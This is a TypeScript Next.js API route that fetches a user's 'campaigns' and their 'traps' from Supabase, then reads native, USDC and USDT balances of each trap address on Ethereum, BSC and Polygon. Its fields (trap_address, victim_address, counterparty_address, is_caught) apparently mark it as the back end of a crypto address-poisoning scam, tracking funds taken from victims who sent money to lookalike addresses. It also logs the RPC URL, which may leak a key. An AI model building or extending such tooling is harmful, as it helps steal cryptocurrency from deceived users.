import { NextRequest, NextResponse } from 'next/server';
import { getAuthUser } from '@app-lib/auth';
import { createServerSupabaseClient } from '@app-lib/supabaseServer';
import { createPublicClient, http, formatEther, formatUnits } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';

const chainMap = { ethereum: mainnet, bsc, polygon };

const tokenMap: Record<string, Record<string, string>> = {
  ethereum: {
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  },
  bsc: {
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    USDT: '0x55d398326f99059fF775485246999027B3197955',
  },
  polygon: {
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',      // bridged USDC
    USDC_NATIVE: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', // native USDC
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  },
};

// ─── Token decimals per chain ───
const tokenDecimalsMap: Record<string, Record<string, number>> = {
  ethereum: {
    USDC: 6,
    USDT: 6,
  },
  bsc: {
    USDC: 18,
    USDT: 18,
  },
  polygon: {
    USDC: 6,
    USDC_NATIVE: 6,
    USDT: 6,
  },
};

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: 'owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function',
  },
] as const;

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    const user = await getAuthUser();
    if (!user) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const supabase = await createServerSupabaseClient();

    // Verify campaign
    const { data: campaign, error } = await supabase
      .from('campaigns')
      .select('id, chain')
      .eq('id', id)
      .eq('user_id', user.id)
      .single();

    if (error || !campaign) {
      console.error('[balances] Campaign error:', error);
      return NextResponse.json({ error: 'Campaign not found' }, { status: 404 });
    }

    // Fetch traps
    const { data: traps, error: trapsError } = await supabase
      .from('traps')
      .select('trap_address, victim_address, counterparty_address, is_caught')
      .eq('campaign_id', id);

    if (trapsError) {
      console.error('[balances] Traps query error:', trapsError);
      return NextResponse.json({ error: 'Failed to fetch traps' }, { status: 500 });
    }

    if (!traps || traps.length === 0) {
      return NextResponse.json({ balances: [] });
    }

    const chainKey = campaign.chain.toUpperCase();
    const rpcUrl = process.env[`${chainKey}_RPC_URL`] || process.env.NODE_RPC_URL;
    if (!rpcUrl) {
      console.error('[balances] No RPC URL for chain:', chainKey);
      return NextResponse.json({ error: 'RPC URL not configured' }, { status: 500 });
    }

    console.log(`[balances] Using RPC: ${rpcUrl} for chain ${campaign.chain}`);

    const chain = chainMap[campaign.chain as keyof typeof chainMap];
    if (!chain) {
      return NextResponse.json({ error: 'Unsupported chain' }, { status: 400 });
    }

    const client = createPublicClient({
      chain,
      transport: http(rpcUrl, { timeout: 15000 }),
    });

    const tokenAddresses = tokenMap[campaign.chain as keyof typeof tokenMap] || {};
    const decimalsForChain = tokenDecimalsMap[campaign.chain as keyof typeof tokenDecimalsMap] || {};
    const results = [];
    const errors: string[] = [];

    for (const trap of traps) {
      const address = trap.trap_address as `0x${string}`;
      const result: any = {
        trapAddress: address,
        victimAddress: trap.victim_address,
        counterpartyAddress: trap.counterparty_address,
        isCaught: trap.is_caught,
        native: '0',
        tokens: {},
      };

      // Native balance
      try {
        const balance = await client.getBalance({ address });
        result.native = formatEther(balance);
      } catch (e) {
        const errMsg = e instanceof Error ? e.message : String(e);
        console.warn(`[balances] Native balance failed for ${address}:`, errMsg);
        errors.push(`Native balance for ${address}: ${errMsg}`);
      }

      // Token balances
      for (const [symbol, tokenAddr] of Object.entries(tokenAddresses)) {
        try {
          const balance = await client.readContract({
            address: tokenAddr as `0x${string}`,
            abi: ERC20_ABI,
            functionName: 'balanceOf',
            args: [address],
          }) as bigint;

          const decimals = decimalsForChain[symbol] ?? 18;
          result.tokens[symbol] = formatUnits(balance, decimals);
          console.log(`[balances] ${symbol} balance for ${address}: ${formatUnits(balance, decimals)}`);
        } catch (e) {
          const errMsg = e instanceof Error ? e.message : String(e);
          console.warn(`[balances] Token ${symbol} failed for ${address}:`, errMsg);
          errors.push(`Token ${symbol} for ${address}: ${errMsg}`);
          result.tokens[symbol] = '0';
        }
      }

      results.push(result);
    }

    if (errors.length > 0) {
      console.warn('[balances] Encountered errors:', errors.slice(0, 5));
    }

    return NextResponse.json({ balances: results });
  } catch (err) {
    console.error('[balances] Unexpected error:', err);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}